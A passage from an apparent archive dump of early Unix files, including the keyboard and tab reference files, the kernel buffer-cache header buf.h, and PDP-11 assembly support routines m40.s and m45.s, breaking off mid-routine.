1	      1		    1		  1

2	      2		    2		  2

3	      3		    3		  3





-- /usr/pub/kbd mode=0100664 uid=3 gid=3 atime=169848978 mtime=169259754 --

<[1234567890-_]^\ >qwertyuiop@ asdfghjkl;: zxcvbnm,./

<[1234567890-_]^\ >          @          ;:        ,./


<{!"#$%&'() =_}~| >QWERTYUIOP` ASDFGHJKL+* ZXCVBNM,.?

<{ !"#$%&'() =_} ~ |  >QWERTYUIOP`  ASDFGHJKL+* ZXCVBNM,.?













-- /usr/pub/tabs mode=0100664 uid=3 gid=3 atime=169848979 mtime=169259755 --

2
        1        1        1        1        1        1        1        1        1        1
012345670123456701234567012345670123456701234567012345670123456701234567
	x	x	x	x	x	x	x	x	x
-- /usr/source mode=0140775 uid=3 gid=3 atime=174916995 mtime=169271597 --
-- /usr/sys mode=0140775 uid=3 gid=3 atime=174929564 mtime=172643351 --
-- /usr/sys/buf.h mode=0100664 uid=3 gid=3 atime=174921986 mtime=174905420 --
/*
 * Each buffer in the pool is usually doubly linked into 2 lists:
 * the device with which it is currently associated (always)
 * and also on a list of blocks available for allocation
 * for other use (usually).
 * The latter list is kept in last-used order, and the two
 * lists are doubly linked to make it easy to remove
 * a buffer from one list when it was found by
 * looking through the other.
 * A buffer is on the available list, and is liable
 * to be reassigned to another disk block, if and only
 * if it is not marked BUSY.  When a buffer is busy, the
 * available-list pointers can be used for other purposes.
 * Most drivers use the forward ptr as a link in their I/O
 * active queue.
 * A buffer header contains all the information required
 * to perform I/O.
 * Most of the routines which manipulate these things
 * are in bio.c.
 */
struct buf
{
	int	b_flags;		/* see defines below */
	struct	buf *b_forw;		/* headed by devtab of b_dev */
	struct	buf *b_back;		/*  "  */
	struct	buf *av_forw;		/* position on free list, */
	struct	buf *av_back;		/*     if not BUSY*/
	int	b_dev;			/* major+minor device name */
	int	b_wcount;		/* transfer count (usu. words) */
	char	*b_addr;		/* low order core address */
	char	*b_xmem;		/* high order core address */
	char	*b_blkno;		/* block # on device */
	char	b_error;		/* returned after I/O */
	char	*b_resid;		/* words not transferred after error */
} buf[NBUF];

/*
 * Each block device has a devtab, which contains private state stuff
 * and 2 list heads: the b_forw/b_back list, which is doubly linked
 * and has all the buffers currently associated with that major
 * device; and the d_actf/d_actl list, which is private to the
 * device but in fact is always used for the head and tail
 * of the I/O queue for the device.
 * Various routines in bio.c look at b_forw/b_back
 * (notice they are the same as in the buf structure)
 * but the rest is private to each device driver.
 */
struct devtab
{
	char	d_active;		/* busy flag */
	char	d_errcnt;		/* error count (for recovery) */
	struct	buf *b_forw;		/* first buffer for this dev */
	struct	buf *b_back;		/* last buffer for this dev */
	struct	buf *d_actf;		/* head of I/O queue */
	struct 	buf *d_actl;		/* tail of I/O queue */
};

/*
 * This is the head of the queue of available
 * buffers-- all unused except for the 2 list heads.
 */
struct	buf bfreelist;

/*
 * These flags are kept in b_flags.
 */
#define	B_WRITE	0	/* non-read pseudo-flag */
#define	B_READ	01	/* read when I/O occurs */
#define	B_DONE	02	/* transaction finished */
#define	B_ERROR	04	/* transaction aborted */
#define	B_BUSY	010	/* not on av_forw/back list */
#define	B_PHYS	020	/* Physical IO potentially using UNIBUS map */
#define	B_MAP	040	/* This block has the UNIBUS map allocated */
#define	B_WANTED 0100	/* issue wakeup when BUSY goes off */
#define	B_RELOC	0200	/* no longer used */
#define	B_ASYNC	0400	/* don't wait for I/O completion */
#define	B_DELWRI 01000	/* don't write till block leaves available list */
-- /usr/sys/conf mode=0140775 uid=3 gid=3 atime=174929527 mtime=174929527 --
-- /usr/sys/conf/data.s mode=0100664 uid=3 gid=3 atime=174910967 mtime=174843436 --
/ l45.o needs to be in data space
/ to get l45.o; as data.s l.s
.data
-- /usr/sys/conf/m40.s mode=0110664 uid=3 gid=3 atime=174922030 mtime=174905486 --
/ machine language assist
/ for 11/40

/ non-UNIX instructions
mfpi	= 6500^tst
mtpi	= 6600^tst
wait	= 1
rtt	= 6
reset	= 5

.globl	trap, call
.globl	_trap
trap:
	mov	PS,-4(sp)
	tst	nofault
	bne	1f
	mov	SSR0,ssr
	mov	SSR2,ssr+4
	mov	$1,SSR0
	jsr	r0,call1; _trap
	/ no return
1:
	mov	$1,SSR0
	mov	nofault,(sp)
	rtt

.globl	_runrun, _swtch
call1:
	tst	-(sp)
	bic	$340,PS
	br	1f

call:
	mov	PS,-(sp)
1:
	mov	r1,-(sp)
	mfpi	sp
	mov	4(sp),-(sp)
	bic	$!37,(sp)
	bit	$30000,PS
	beq	1f
	jsr	pc,*(r0)+
2:
	bis	$340,PS
	tstb	_runrun
	beq	2f
	bic	$340,PS
	jsr	pc,_swtch
	br	2b
2:
	tst	(sp)+
	mtpi	sp
	br	2f
1:
	bis	$30000,PS
	jsr	pc,*(r0)+
	cmp	(sp)+,(sp)+
2:
	mov	(sp)+,r1
	tst	(sp)+
	mov	(sp)+,r0
	rtt

.globl	_savfp, _display
_savfp:
_display:
	rts	pc

.globl	_incupc
_incupc:
	mov	r2,-(sp)
	mov	6(sp),r2	/ base of prof with base,leng,off,scale
	mov	4(sp),r0	/ pc
	sub	4(r2),r0	/ offset
	clc
	ror	r0
	mul	6(r2),r0	/ scale
	ashc	$-14.,r0
	inc	r1
	bic	$1,r1
	cmp	r1,2(r2)	/ length
	bhis	1f
	add	(r2),r1		/ base
	mov	nofault,-(sp)
	mov	$2f,nofault
	mfpi	(r1)
	inc	(sp)
	mtpi	(r1)
	br	3f
2:
	clr	6(r2)
3:
	mov	(sp)+,nofault
1:
	mov	(sp)+,r2
	rts	pc

/ Character list get/put

.globl	_getc, _putc
.globl	_cfreelist

_getc:
	mov	2(sp),r1
	mov	PS,-(sp)
	mov	r2,-(sp)
	bis	$340,PS
	bic	$100,PS		/ spl 5
	mov	2(r1),r2	/ first ptr
	beq	9f		/ empty
	movb	(r2)+,r0	/ character
	bic	$!377,r0
	mov	r2,2(r1)
	dec	(r1)+		/ count
	bne	1f
	clr	(r1)+
	clr	(r1)+		/ last block
	br	2f
1:
	bit	$7,r2
	bne	3f
	mov	-10(r2),(r1)	/ next block
	add	$2,(r1)
2:
	dec	r2
	bic	$7,r2
	mov	_cfreelist,(r2)
	mov	r2,_cfreelist
3:
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc
9:
	clr	4(r1)
	mov	$-1,r0
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc

_putc:
	mov	2(sp),r0
	mov	4(sp),r1
	mov	PS,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	bis	$340,PS
	bic	$100,PS		/ spl 5
	mov	4(r1),r2	/ last ptr
	bne	1f
	mov	_cfreelist,r2
	beq	9f
	mov	(r2),_cfreelist
	clr	(r2)+
	mov	r2,2(r1)	/ first ptr
	br	2f
1:
	bit	$7,r2
	bne	2f
	mov	_cfreelist,r3
	beq	9f
	mov	(r3),_cfreelist
	mov	r3,-10(r2)
	mov	r3,r2
	clr	(r2)+
2:
	movb	r0,(r2)+
	mov	r2,4(r1)
	inc	(r1)		/ count
	clr	r0
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc
9:
	mov	pc,r0
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc

.globl	_backup
.globl	_regloc
_backup:
	mov	2(sp),ssr+2
	mov	r2,-(sp)
	jsr	pc,backup
	mov	r2,ssr+2
	mov	(sp)+,r2
	movb	jflg,r0
	bne	2f
	mov	2(sp),r0
	movb	ssr+2,r1
	jsr	pc,1f
	movb	ssr+3,r1
	jsr	pc,1f
	movb	_regloc+7,r1
	asl	r1
	add	r0,r1
	mov	ssr+4,(r1)
	clr	r0
2:
	rts	pc
1:
	mov	r1,-(sp)
	asr	(sp)
	asr	(sp)
	asr	(sp)
	bic	$!7,r1
	movb	_regloc(r1),r1
	asl	r1
	add	r0,r1
	sub	(sp)+,(r1)
	rts	pc

/ hard part
/ simulate the ssr2 register missing on 11/40

backup:
	clr	r2		/ backup register ssr1
	mov	$1,bflg		/ clrs jflg
	mov	ssr+4,r0
	jsr	pc,fetch
	mov	r0,r1
	ash	$-11.,r0
	bic	$!36,r0
	jmp	*0f(r0)
0:		t00; t01; t02; t03; t04; t05; t06; t07
		t10; t11; t12; t13; t14; t15; t16; t17

t00:
	clrb	bflg

t10:
	mov	r1,r0
	swab	r0
	bic	$!16,r0
	jmp	*0f(r0)
0:		u0; u1; u2; u3; u4; u5; u6; u7

u6:	/ single op, m[tf]pi, sxt, illegal
	bit	$400,r1
	beq	u5		/ all but m[tf], sxt
	bit	$200,r1
	beq	1f		/ mfpi
	bit	$100,r1
	bne	u5		/ sxt

/ simulate mtpi with double (sp)+,dd
	bic	$4000,r1	/ turn instr into (sp)+
	br	t01

/ simulate mfpi with double ss,-(sp)
1:
	ash	$6,r1
	bis	$46,r1		/ -(sp)
	br	t01

u4:	/ jsr
	mov	r1,r0
	jsr	pc,setreg	/ assume no fault
	bis	$173000,r2	/ -2 from sp
	rts	pc

t07:	/ EIS
	clrb	bflg

u0:	/ jmp, swab
u5:	/ single op
	mov	r1,r0
	br	setreg

t01:	/ mov
t02:	/ cmp
t03:	/ bit
t04:	/ bic
t05:	/ bis
t06:	/ add
t16:	/ sub
	clrb	bflg

t11:	/ movb
t12:	/ cmpb
t13:	/ bitb
t14:	/ bicb
t15:	/ bisb
	mov	r1,r0
	ash	$-6,r0
	jsr	pc,setreg
	swab	r2
	mov	r1,r0
	jsr	pc,setreg

/ if delta(dest) is zero,
/ no need to fetch source

	bit	$370,r2
	beq	1f

/ if mode(source) is R,
/ no fault is possible

	bit	$7000,r1
	beq	1f

/ if reg(source) is reg(dest),
/ too bad.

	mov	r2,-(sp)
	bic	$174370,(sp)
	cmpb	1(sp),(sp)+
	beq	t17

/ start source cycle
/ pick up value of reg

	mov	r1,r0
	ash	$-6,r0
	bic	$!7,r0
	movb	_regloc(r0),r0
	asl	r0
	add	ssr+2,r0
	mov	(r0),r0

/ if reg has been incremented,
/ must decrement it before fetch

	bit	$174000,r2
	ble	2f
	dec	r0
	bit	$10000,r2
	beq	2f
	dec	r0
2:

/ if mode is 6,7 fetch and add X(R) to R

	bit	$4000,r1
	beq	2f
	bit	$2000,r1
	beq	2f
	mov	r0,-(sp)
	mov	ssr+4,r0
	add	$2,r0
	jsr	pc,fetch
	add	(sp)+,r0
2:

/ fetch operand
/ if mode is 3,5,7 fetch *

	jsr	pc,fetch
	bit	$1000,r1
	beq	1f
	bit	$6000,r1
	bne	fetch
1:
	rts	pc

t17:	/ illegal
u1:	/ br
u2:	/ br
u3:	/ br
u7:	/ illegal
	incb	jflg
	rts	pc

setreg:
	mov	r0,-(sp)
	bic	$!7,r0
	bis	r0,r2
	mov	(sp)+,r0
	ash	$-3,r0
	bic	$!7,r0
	movb	0f(r0),r0
	tstb	bflg
	beq	1f
	bit	$2,r2
	beq	2f
	bit	$4,r2
	beq	2f
1:
	cmp	r0,$20
	beq	2f
	cmp	r0,$-20
	beq	2f
	asl	r0
2:
	bisb	r0,r2
	rts	pc

0:	.byte	0,0,10,20,-10,-20,0,0

fetch:
	bic	$1,r0
	mov	nofault,-(sp)
	mov	$1f,nofault
	mfpi	(r0)
	mov	(sp)+,r0
	mov	(sp)+,nofault
	rts	pc

1:
 	mov	(sp)+,nofault
	clrb	r2			/ clear out dest on fault
	mov	$-1,r0
	rts	pc

.bss
bflg:	.=.+1
jflg:	.=.+1
.text

.globl	_fubyte, _subyte
.globl	_fuibyte, _suibyte
.globl	_fuword, _suword
.globl	_fuiword, _suiword
_fuibyte:
_fubyte:
	mov	2(sp),r1
	bic	$1,r1
	jsr	pc,gword
	cmp	r1,2(sp)
	beq	1f
	swab	r0
1:
	bic	$!377,r0
	rts	pc

_suibyte:
_subyte:
	mov	2(sp),r1
	bic	$1,r1
	jsr	pc,gword
	mov	r0,-(sp)
	cmp	r1,4(sp)
	beq	1f
	movb	6(sp),1(sp)
	br	2f
1:
	movb	6(sp),(sp)
2:
	mov	(sp)+,r0
	jsr	pc,pword
	clr	r0
	rts	pc

_fuiword:
_fuword:
	mov	2(sp),r1
fuword:
	jsr	pc,gword
	rts	pc

gword:
	mov	PS,-(sp)
	bis	$340,PS
	mov	nofault,-(sp)
	mov	$err,nofault
	mfpi	(r1)
	mov	(sp)+,r0
	br	1f

_suiword:
_suword:
	mov	2(sp),r1
	mov	4(sp),r0
suword:
	jsr	pc,pword
	rts	pc

pword:
	mov	PS,-(sp)
	bis	$340,PS
	mov	nofault,-(sp)
	mov	$err,nofault
	mov	r0,-(sp)
	mtpi	(r1)
1:
	mov	(sp)+,nofault
	mov	(sp)+,PS
	rts	pc

err:
	mov	(sp)+,nofault
	mov	(sp)+,PS
	tst	(sp)+
	mov	$-1,r0
	rts	pc

.globl	_copyin, _copyout
_copyin:
	jsr	pc,copsu
1:
	mfpi	(r0)+
	mov	(sp)+,(r1)+
	sob	r2,1b
	br	2f

_copyout:
	jsr	pc,copsu
1:
	mov	(r0)+,-(sp)
	mtpi	(r1)+
	sob	r2,1b
2:
	mov	(sp)+,nofault
	mov	(sp)+,r2
	clr	r0
	rts	pc

copsu:
	mov	(sp)+,r0
	mov	r2,-(sp)
	mov	nofault,-(sp)
	mov	r0,-(sp)
	mov	10(sp),r0
	mov	12(sp),r1
	mov	14(sp),r2
	asr	r2
	mov	$1f,nofault
	rts	pc

1:
	mov	(sp)+,nofault
	mov	(sp)+,r2
	mov	$-1,r0
	rts	pc

.globl	_idle
_idle:
	mov	PS,-(sp)
	bic	$340,PS
	wait
	mov	(sp)+,PS
	rts	pc

.globl	_savu, _retu, _aretu
_savu:
	bis	$340,PS
	mov	(sp)+,r1
	mov	(sp),r0
	mov	sp,(r0)+
	mov	r5,(r0)+
	bic	$340,PS
	jmp	(r1)

_aretu:
	bis	$340,PS
	mov	(sp)+,r1
	mov	(sp),r0
	br	1f

_retu:
	bis	$340,PS
	mov	(sp)+,r1
	mov	(sp),KISA6
	mov	$_u,r0
1:
	mov	(r0)+,sp
	mov	(r0)+,r5
	bic	$340,PS
	jmp	(r1)

.globl	_spl0, _spl1, _spl4, _spl5, _spl6, _spl7
_spl0:
	bic	$340,PS
	rts	pc

_spl1:
	bis	$40,PS
	bic	$300,PS
	rts	pc

_spl4:
_spl5:
	bis	$340,PS
	bic	$100,PS
	rts	pc

_spl6:
	bis	$340,PS
	bic	$40,PS
	rts	pc

_spl7:
	bis	$340,PS
	rts	pc

.globl	_copyseg
_copyseg:
	mov	PS,-(sp)
	mov	UISA0,-(sp)
	mov	UISA1,-(sp)
	mov	$30340,PS
	mov	10(sp),UISA0
	mov	12(sp),UISA1
	mov	UISD0,-(sp)
	mov	UISD1,-(sp)
	mov	$6,UISD0
	mov	$6,UISD1
	mov	r2,-(sp)
	clr	r0
	mov	$8192.,r1
	mov	$32.,r2
1:
	mfpi	(r0)+
	mtpi	(r1)+
	sob	r2,1b
	mov	(sp)+,r2
	mov	(sp)+,UISD1
	mov	(sp)+,UISD0
	mov	(sp)+,UISA1
	mov	(sp)+,UISA0
	mov	(sp)+,PS
	rts	pc

.globl	_clearseg
_clearseg:
	mov	PS,-(sp)
	mov	UISA0,-(sp)
	mov	$30340,PS
	mov	6(sp),UISA0
	mov	UISD0,-(sp)
	mov	$6,UISD0
	clr	r0
	mov	$32.,r1
1:
	clr	-(sp)
	mtpi	(r0)+
	sob	r1,1b
	mov	(sp)+,UISD0
	mov	(sp)+,UISA0
	mov	(sp)+,PS
	rts	pc

.globl	_dpadd
_dpadd:
	mov	2(sp),r0
	add	4(sp),2(r0)
	adc	(r0)
	rts	pc

.globl	_dpcmp
_dpcmp:
	mov	2(sp),r0
	mov	4(sp),r1
	sub	6(sp),r0
	sub	8(sp),r1
	sbc	r0
	bge	1f
	cmp	r0,$-1
	bne	2f
	cmp	r1,$-512.
	bhi	3f
2:
	mov	$-512.,r0
	rts	pc
1:
	bne	2f
	cmp	r1,$512.
	blo	3f
2:
	mov	$512.,r1
3:
	mov	r1,r0
	rts	pc

.globl	dump
dump:
	bit	$1,SSR0
	bne	dump

/ save regs r0,r1,r2,r3,r4,r5,r6,KIA6
/ starting at abs location 4

	mov	r0,4
	mov	$6,r0
	mov	r1,(r0)+
	mov	r2,(r0)+
	mov	r3,(r0)+
	mov	r4,(r0)+
	mov	r5,(r0)+
	mov	sp,(r0)+
	mov	KISA6,(r0)+

/ dump all of core (ie to first mt error)
/ onto mag tape. (9 track or 7 track 'binary')

	mov	$MTC,r0
	mov	$60004,(r0)+
	clr	2(r0)
1:
	mov	$-512.,(r0)
	inc	-(r0)
2:
	tstb	(r0)
	bge	2b
	tst	(r0)+
	bge	1b
	reset

/ end of file and loop

	mov	$60007,-(r0)
	br	.

.globl	start, _end, _edata, _main
start:
	bit	$1,SSR0
	bne	start			/ loop if restart
	reset

/ initialize systems segments

	mov	$KISA0,r0
	mov	$KISD0,r1
	mov	$200,r4
	clr	r2
	mov	$6,r3
1:
	mov	r2,(r0)+
	mov	$77406,(r1)+		/ 4k rw
	add	r4,r2
	sob	r3,1b

/ initialize user segment

	mov	$_end+63.,r2
	ash	$-6,r2
	bic	$!1777,r2
	mov	r2,(r0)+		/ ksr6 = sysu
	mov	$usize-1\<8|6,(r1)+

/ initialize io segment
/ set up counts on supervisor segments

	mov	$IO,(r0)+
	mov	$77406,(r1)+		/ rw 4k

/ get a sp and start segmentation

	mov	$_u+[usize*64.],sp
	inc	SSR0

/ clear bss

	mov	$_edata,r0
1:
	clr	(r0)+
	cmp	r0,$_end
	blo	1b

/ clear user block

	mov	$_u,r0
1:
	clr	(r0)+
	cmp	r0,$_u+[usize*64.]
	blo	1b

/ set up previous mode and call main
/ on return, enter user mode at 0R

	mov	$30000,PS
	jsr	pc,_main
	mov	$170000,-(sp)
	clr	-(sp)
	rtt

.globl	_ldiv
_ldiv:
	clr	r0
	mov	2(sp),r1
	div	4(sp),r0
	rts	pc

.globl	_lrem
_lrem:
	clr	r0
	mov	2(sp),r1
	div	4(sp),r0
	mov	r1,r0
	rts	pc

.globl	_lshift
_lshift:
	mov	2(sp),r1
	mov	(r1)+,r0
	mov	(r1),r1
	ashc	4(sp),r0
	mov	r1,r0
	rts	pc

.globl	csv
csv:
	mov	r5,r0
	mov	sp,r5
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	jsr	pc,(r0)

.globl cret
cret:
	mov	r5,r1
	mov	-(r1),r4
	mov	-(r1),r3
	mov	-(r1),r2
	mov	r5,sp
	mov	(sp)+,r5
	rts	pc

.globl	_u
_u	= 140000
usize	= 16.

PS	= 177776
SSR0	= 177572
SSR2	= 177576
KISA0	= 172340
KISA6	= 172354
KISD0	= 172300
MTC	= 172522
UISA0	= 177640
UISA1	= 177642
UISD0	= 177600
UISD1	= 177602
IO	= 7600

.data
.globl	_ka6, _cputype
_ka6:	KISA6
_cputype:40.

.bss
.globl	nofault, ssr, badtrap
nofault:.=.+2
ssr:	.=.+6
badtrap:.=.+2
-- /usr/sys/conf/m45.s mode=0110664 uid=3 gid=3 atime=174916766 mtime=174905516 --
/ machine language assist
/ for 11/45 or 11/70 CPUs

.fpp = 1

/ non-UNIX instructions
mfpi	= 6500^tst
mtpi	= 6600^tst
mfpd	= 106500^tst
mtpd	= 106600^tst
spl	= 230
ldfps	= 170100^tst
stfps	= 170200^tst
wait	= 1
rtt	= 6
reset	= 5

HIPRI	= 300
HIGH	= 6

/ Mag tape dump
/ save registers in low core and
/ write all core onto mag tape.
/ entry is thru 44 abs

.data
.globl	dump
dump:
	bit	$1,SSR0
	bne	dump

/ save regs r0,r1,r2,r3,r4,r5,r6,KIA6
/ starting at abs location 4

	mov	r0,4
	mov	$6,r0
	mov	r1,(r0)+
	mov	r2,(r0)+
	mov	r3,(r0)+
	mov	r4,(r0)+
	mov	r5,(r0)+
	mov	sp,(r0)+
	mov	KDSA6,(r0)+

/ dump all of core (ie to first mt error)
/ onto mag tape. (9 track or 7 track 'binary')

	mov	$MTC,r0
	mov	$60004,(r0)+
	clr	2(r0)
1:
	mov	$-512.,(r0)
	inc	-(r0)
2:
	tstb	(r0)
	bge	2b
	tst	(r0)+
	bge	1b
	reset

/ end of file and loop

	mov	$60007,-(r0)
	br	.

.globl	start, _end, _edata, _etext, _main

/ 11/45 and 11/70 startup.
/ entry is thru 0 abs.
/ since core is shuffled,
/ this code can be executed but once

start:
	inc	$-1
	bne	.
	reset
	clr	PS

/ set KI0 to physical 0

	mov	$77406,r3
	mov	$KISA0,r0
	mov	$KISD0,r1
	clr	(r0)+
	mov	r3,(r1)+

/ set KI1-6 to eventual text resting place

	mov	$_end+63.,r2
	ash	$-6,r2
	bic	$!1777,r2
1:
	mov	r2,(r0)+
	mov	r3,(r1)+
	add	$200,r2
	cmp	r0,$KISA7
	blos	1b

/ set KI7 to IO seg for escape

	mov	$IO,-(r0)

/ set KD0-7 to physical

	mov	$KDSA0,r0
	mov	$KDSD0,r1
	clr	r2
1:
	mov	r2,(r0)+
	mov	r3,(r1)+
	add	$200,r2
	cmp	r0,$KDSA7
	blos	1b

/ initialization
/ get a temp (1-word) stack
/ turn on segmentation
/ copy text to I space
/ clear bss in D space

	mov	$stk+2,sp
	mov	$65,SSR3		/ 22-bit, map, K+U sep
	bit	$20,SSR3
	beq	1f
	mov	$70.,_cputype
1:
	inc	SSR0
	mov	$_etext,r0
	mov	$_edata,r1
	add	$_etext-8192.,r1
1:
	mov	-(r1),-(sp)
	mtpi	-(r0)
	cmp	r1,$_edata
	bhi	1b
1:
	clr	(r1)+
	cmp	r1,$_end
	blo	1b

/ use KI escape to set KD7 to IO seg
/ set KD6 to first available core

	mov	$IO,-(sp)
	mtpi	*$KDSA7
	mov	$_etext-8192.+63.,r2
	ash	$-6,r2
	bic	$!1777,r2
	add	KISA1,r2
	mov	r2,KDSA6

/ set up supervisor D registers

	mov	$6,SISD0
	mov	$6,SISD1

/ set up real sp
/ clear user block

	mov	$_u+[usize*64.],sp
	mov	$_u,r0
1:
	clr	(r0)+
	cmp	r0,sp
	blo	1b
/	jsr	pc,_isprof

/ set up previous mode and call main
/ on return, enter user mode at 0R

	mov	$30000,PS
	jsr	pc,_main
	mov	$170000,-(sp)
	clr	-(sp)
	rtt

.globl	trap, call
.globl	_trap

/ all traps and interrupts are
/ vectored thru this routine.

trap:
	mov	PS,saveps
	tst	nofault
	bne	1f
	mov	SSR0,ssr
	mov	SSR1,ssr+2
	mov	SSR2,ssr+4
	mov	$1,SSR0
	jsr	r0,call1; _trap
	/ no return
1:
	mov	$1,SSR0
	mov	nofault,(sp)
	rtt
.text

.globl	_runrun, _swtch
call1:
	mov	saveps,-(sp)
	spl	0
	br	1f

call:
	mov	PS,-(sp)
1:
	mov	r1,-(sp)
	mfpd	sp
	mov	4(sp),-(sp)
	bic	$!37,(sp)
	bit	$30000,PS
	beq	1f
.if .fpp
	mov	$20,_u+4		/ FP maint mode
.endif
	jsr	pc,*(r0)+
2:
	spl	HIGH
	tstb	_runrun
	beq	2f
	spl	0
	jsr	pc,_savfp
	jsr	pc,_swtch
	br	2b
2:
.if .fpp
	mov	$_u+4,r1
	bit	$20,(r1)
	bne	2f
	mov	(r1)+,r0
	ldfps	r0
	movf	(r1)+,fr0
	movf	(r1)+,fr1
	movf	fr1,fr4
	movf	(r1)+,fr1
	movf	fr1,fr5
	movf	(r1)+,fr1
	movf	(r1)+,fr2
	movf	(r1)+,fr3
	ldfps	r0
2:
.endif
	tst	(sp)+
	mtpd	sp
	br	2f
1:
	bis	$30000,PS
	jsr	pc,*(r0)+
	cmp	(sp)+,(sp)+
2:
	mov	(sp)+,r1
	tst	(sp)+
	mov	(sp)+,r0
	rtt

.globl	_savfp
_savfp:
.if .fpp
	mov	$_u+4,r1
	bit	$20,(r1)
	beq	1f
	stfps	(r1)+
	movf	fr0,(r1)+
	movf	fr4,fr0
	movf	fr0,(r1)+
	movf	fr5,fr0
	movf	fr0,(r1)+
	movf	fr1,(r1)+
	movf	fr2,(r1)+
	movf	fr3,(r1)+
1:
.endif
	rts	pc

.globl	_incupc
_incupc:
	mov	r2,-(sp)
	mov	6(sp),r2	/ base of prof with base,leng,off,scale
	mov	4(sp),r0	/ pc
	sub	4(r2),r0	/ offset
	clc
	ror	r0
	mul	6(r2),r0	/ scale
	ashc	$-14.,r0
	inc	r1
	bic	$1,r1
	cmp	r1,2(r2)	/ length
	bhis	1f
	add	(r2),r1		/ base
	mov	nofault,-(sp)
	mov	$2f,nofault
	mfpd	(r1)
	inc	(sp)
	mtpd	(r1)
	br	3f
2:
	clr	6(r2)
3:
	mov	(sp)+,nofault
1:
	mov	(sp)+,r2
	rts	pc

.globl	_display
_display:
	dec	dispdly
	bge	2f
	clr	dispdly
	mov	PS,-(sp)
	mov	$HIPRI,PS
	mov	CSW,r1
	bit	$1,r1
	beq	1f
	bis	$30000,PS
	dec	r1
1:
	jsr	pc,fuword
	mov	r0,CSW
	mov	(sp)+,PS
	cmp	r0,$-1
	bne	2f
	mov	$120.,dispdly		/ 2 sec delay after CSW fault
2:
	rts	pc

/ Character list get/put

.globl	_getc, _putc
.globl	_cfreelist

_getc:
	mov	2(sp),r1
	mov	PS,-(sp)
	mov	r2,-(sp)
	spl	5
	mov	2(r1),r2	/ first ptr
	beq	9f		/ empty
	movb	(r2)+,r0	/ character
	bic	$!377,r0
	mov	r2,2(r1)
	dec	(r1)+		/ count
	bne	1f
	clr	(r1)+
	clr	(r1)+		/ last block
	br	2f
1:
	bit	$7,r2
	bne	3f
	mov	-10(r2),(r1)	/ next block
	add	$2,(r1)
2:
	dec	r2
	bic	$7,r2
	mov	_cfreelist,(r2)
	mov	r2,_cfreelist
3:
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc
9:
	clr	4(r1)
	mov	$-1,r0
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc

_putc:
	mov	2(sp),r0
	mov	4(sp),r1
	mov	PS,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	spl	5
	mov	4(r1),r2	/ last ptr
	bne	1f
	mov	_cfreelist,r2
	beq	9f
	mov	(r2),_cfreelist
	clr	(r2)+
	mov	r2,2(r1)	/ first ptr
	br	2f
1:
	bit	$7,r2
	bne	2f
	mov	_cfreelist,r3
	beq	9f
	mov	(r3),_cfreelist
	mov	r3,-10(r2)
	mov	r3,r2
	clr	(r2)+
2:
	movb	r0,(r2)+
	mov	r2,4(r1)
	inc	(r1)		/ count
	clr	r0
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc
9:
	mov	pc,r0
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc

.globl	_backup
.globl	_regloc
_backup:
	mov	2(sp),r0
	movb	ssr+2,r1
	jsr	pc,1f
	movb	ssr+3,r1
	jsr	pc,1f
	movb	_regloc+7,r1
	asl	r1
	add	r0,r1
	mov	ssr+4,(r1)
	clr	r0
2:
	rts	pc
1:
	mov	r1,-(sp)
	asr	(sp)
	asr	(sp)
	asr	(sp)
	bic	$!7,r1
	movb	_regloc(r1),r1
	asl	r1
	add	r0,r1
	sub	(sp)+,(r1)
	rts	pc


.globl	_fubyte, _subyte
.globl	_fuword, _suword
.globl	_fuibyte, _suibyte
.globl	_fuiword, _suiword
_fuibyte:
	mov	2(sp),r1
	bic	$1,r1
	jsr	pc,giword
	br	2f

_fubyte:
	mov	2(sp),r1
	bic	$1,r1
	jsr	pc,gword

2:
	cmp	r1,2(sp)
	beq	1f
	swab	r0
1:
	bic	$!377,r0
	rts	pc

_suibyte:
	mov	2(sp),r1
	bic	$1,r1
	jsr	pc,giword
	mov	r0,-(sp)
	cmp	r1,4(sp)
	beq	1f
	movb	6(sp),1(sp)
	br	2f
1:
	movb	6(sp),(sp)
2:
	mov	(sp)+,r0
	jsr	pc,piword
	clr	r0
	rts	pc

_subyte:
	mov	2(sp),r1
	bic	$1,r1
	jsr	pc,gword
	mov	r0,-(sp)
	cmp	r1,4(sp)
	beq	1f
	movb	6(sp),1(sp)
	br	2f
1:
	movb	6(sp),(sp)
2:
	mov	(sp)+,r0
	jsr	pc,pword
	clr	r0
	rts	pc

_fuiword:
	mov	2(sp),r1
fuiword:
	jsr	pc,giword
	rts	pc

_fuword:
	mov	2(sp),r1
fuword:
	jsr	pc,gword
	rts	pc

giword:
	mov	PS,-(sp)
	spl	HIGH
	mov	nofault,-(sp)
	mov	$err,nofault
	mfpi	(r1)
	mov	(sp)+,r0
	br	1f

gword:
	mov	PS,-(sp)
	spl	HIGH
	mov	nofault,-(sp)
	mov	$err,nofault
	mfpd	(r1)
	mov	(sp)+,r0
	br	1f

_suiword:
	mov	2(sp),r1
	mov	4(sp),r0
suiword:
	jsr	pc,piword
	rts	pc

_suword:
	mov	2(sp),r1
	mov	4(sp),r0
suword:
	jsr	pc,pword
	rts	pc

piword:
	mov	PS,-(sp)
	spl	HIGH
	mov	nofault,-(sp)
	mov	$err,nofault
	mov	r0,-(sp)
	mtpi	(r1)
	br	1f

pword:
	mov	PS,-(sp)
	spl	HIGH
	mov	nofault,-(sp)
	mov	$err,nofault
	mov	r0,-(sp)
	mtpd	(r1)
1:
	mov	(sp)+,nofault
	mov	(sp)+,PS
	rts	pc

err:
	mov	(sp)+,nofault
	mov	(sp)+,PS
	tst	(sp)+
	mov	$-1,r0
	rts	pc

.globl	_copyin, _copyout
.globl	_copyiin, _copyiout
_copyiin:
	jsr	pc,copsu
1:
	mfpi	(r0)+
	mov	(sp)+,(r1)+
	sob	r2,1b
	br	2f

_copyin:
	jsr	pc,copsu
1:
	mfpd	(r0)+
	mov	(sp)+,(r1)+
	sob	r2,1b
	br	2f

_copyiout:
	jsr	pc,copsu
1:
